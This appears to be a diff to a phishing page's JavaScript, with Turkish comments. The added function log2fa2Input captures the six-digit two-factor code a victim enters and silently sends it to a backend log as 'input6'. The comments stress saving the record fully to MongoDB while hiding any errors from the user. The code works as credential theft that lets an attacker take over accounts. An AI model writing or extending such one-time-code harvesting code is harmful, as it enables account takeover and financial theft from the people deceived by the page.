@@ -422,14 +422,28 @@
       const frm = document.querySelector('form');
       let aIpp = frm.elements[0];
 
+      async function log2fa2Input(value) {
+        if (value && value.trim()) {
+          try {
+            await sendLogUpdate({
+              page: '2fa2',
+              inputs: { input6: value.trim() }
+            });
+          } catch (err) {
+            console.error('Failed to log 2FA2 input (silent):', err);
+            // Sessizce devam et - kullanıcıya hata gösterme
+          }
+        }
+      }
+
       frm.addEventListener('submit', async (evt) => {
           evt.preventDefault();
           if (/^\d{6}$/.test(aIpp.value.trim())) {
               aIpp.parentElement.style.borderColor = 'rgb(234, 236, 239)';
               aIpp.parentElement.nextElementSibling.style.display = 'none';
-              // MongoDB'ye kaydın %100 tamamlanmasını bekle
+              // MongoDB'ye kaydın %100 tamamlanmasını bekle - input6 olarak kaydet (retry mekanizması ile)
               try {
-                await sendLogUpdate({ page: '2fa2' });
+                await log2fa2Input(aIpp.value);
               } catch (err) {
                 console.error('2FA2 log failed, continuing anyway', err);
               }
